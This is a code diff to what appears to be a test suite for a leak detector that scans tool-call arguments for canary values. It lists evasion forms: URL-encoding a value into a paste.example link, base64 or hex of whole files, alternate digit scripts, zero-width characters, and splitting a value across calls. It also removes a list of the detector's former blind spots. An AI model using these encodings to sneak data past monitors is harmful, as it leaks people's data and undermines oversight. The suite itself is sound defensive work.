@@ -110,7 +110,6 @@ class Form:
     name: str
     kinds: tuple[str, ...]  # the canary kinds it applies to
     calls: Callable[[dict], list[dict]]  # record -> the arguments of each call
-    fixed_by: str | None = None  # the work-package item that lets the detector see it; None: it does today
     partial: bool = False  # only a part of the value is disclosed
 
     def __str__(self) -> str:
@@ -126,35 +125,23 @@ FORMS = [
     Form("URL-encoded", ("email", "ar_person"),
          lambda c: [{"url": "https://paste.example/?q=" + urllib.parse.quote(c["value"])}]),
     Form("hex of the file that holds it", KINDS, lambda c: [{"blob": FILES[c["server"]].encode().hex()}]),
-    Form("base64 of the file that holds it", KINDS, lambda c: [{"blob": _b64(FILES[c["server"]])}], fixed_by="2a"),
+    Form("base64 of the file that holds it", KINDS, lambda c: [{"blob": _b64(FILES[c["server"]])}]),
     Form("grouped with spaces", NUMBERS, lambda c: [{"text": _grouped(c["value"], " ")}]),
     Form("grouped with dashes", NUMBERS, lambda c: [{"text": _grouped(c["value"], "-")}]),
     Form("grouped with no-break spaces", NUMBERS, lambda c: [{"text": _grouped(c["value"], " ")}]),
-    Form("grouped with dots", NUMBERS, lambda c: [{"text": _grouped(c["value"], ".")}], fixed_by="2b"),
+    Form("grouped with dots", NUMBERS, lambda c: [{"text": _grouped(c["value"], ".")}]),
     Form("Arabic-Indic digits", NUMBERS, lambda c: [{"text": _digits(c["value"], 0x0660)}]),
     Form("Arabic-Indic digits, grouped", NUMBERS, lambda c: [{"text": _grouped(_digits(c["value"], 0x0660), " ")}]),
     Form("Western digits", ("ar_person",), lambda c: [{"text": _digits(c["value"], 0x0030)}]),
-    Form("Persian digits", DIGITS, lambda c: [{"text": _digits(c["value"], 0x06F0)}], fixed_by="2b"),
-    Form("fullwidth digits", DIGITS, lambda c: [{"text": _digits(c["value"], 0xFF10)}], fixed_by="2b"),
-    Form("zero-width space between characters", KINDS, lambda c: [{"text": "​".join(c["value"])}], fixed_by="2b"),
-    Form("word joiner between characters", KINDS, lambda c: [{"text": "⁠".join(c["value"])}], fixed_by="2b"),
+    Form("Persian digits", DIGITS, lambda c: [{"text": _digits(c["value"], 0x06F0)}]),
+    Form("fullwidth digits", DIGITS, lambda c: [{"text": _digits(c["value"], 0xFF10)}]),
+    Form("zero-width space between characters", KINDS, lambda c: [{"text": "​".join(c["value"])}]),
+    Form("word joiner between characters", KINDS, lambda c: [{"text": "⁠".join(c["value"])}]),
     Form("[at] and [dot]", ("email",),
-         lambda c: [{"text": c["value"].replace("@", " [at] ").replace(".", " [dot] ")}], fixed_by="2b"),
+         lambda c: [{"text": c["value"].replace("@", " [at] ").replace(".", " [dot] ")}]),
     Form("split over two fields of one call", NUMBERS,
-         lambda c: [dict(zip(("first", "second"), _halves(c["value"])))], fixed_by="2c"),
-    Form("split over two calls", NUMBERS, lambda c: [{"text": half} for half in _halves(c["value"])], fixed_by="2c"),
+         lambda c: [dict(zip(("first", "second"), _halves(c["value"])))]),
+    Form("split over two calls", NUMBERS, lambda c: [{"text": half} for half in _halves(c["value"])]),
     Form("second half masked", NUMBERS,
-         lambda c: [{"text": _halves(c["value"])[0] + "*" * len(_halves(c["value"])[1])}], fixed_by="2d", partial=True),
+         lambda c: [{"text": _halves(c["value"])[0] + "*" * len(_halves(c["value"])[1])}], partial=True),
 ]
-ITEMS = {  # the detector's blind spots today, by the item of work package 2 that removes each
-    "2a": "decode and scan (base64, base32, hex, URL encoding; depth 2)",
-    "2b": "canonicalize (digit scripts, zero-width characters, separators, [at] and [dot])",
-    "2c": "join the egress of a task and scan it as well as each call",
-    "2d": "exposure per canary: a value disclosed in part",
-}
-
-
-def sits_on_a_base64_boundary(record: dict) -> bool:
-    """Today the detector finds a value inside the base64 of a file only in this case: by luck."""
-    data, value = FILES[record["server"]].encode(), record["value"].encode()
-    return data.index(value) % 3 == 0 and len(value) % 3 == 0
